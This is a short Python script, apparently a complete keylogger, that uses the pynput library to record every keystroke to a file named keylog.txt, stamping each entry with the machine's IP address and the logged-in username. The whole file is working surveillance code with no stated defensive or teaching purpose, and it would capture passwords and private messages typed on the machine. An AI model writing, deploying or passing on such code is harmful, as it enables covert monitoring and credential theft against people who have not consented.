from pynput.keyboard import Key, Listener
import logging
from socket import gethostname, gethostbyname
from os import environ

clientip=gethostbyname(gethostname())
user = environ.get("USERNAME")

logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s :: {0} :: {1} ==> %(message)s".format(clientip, user))
 

def on_press(key):
    key_p = str(key).strip("'")
    logging.info(key_p)
    
with Listener(on_press=on_press) as listener:
    listener.join()

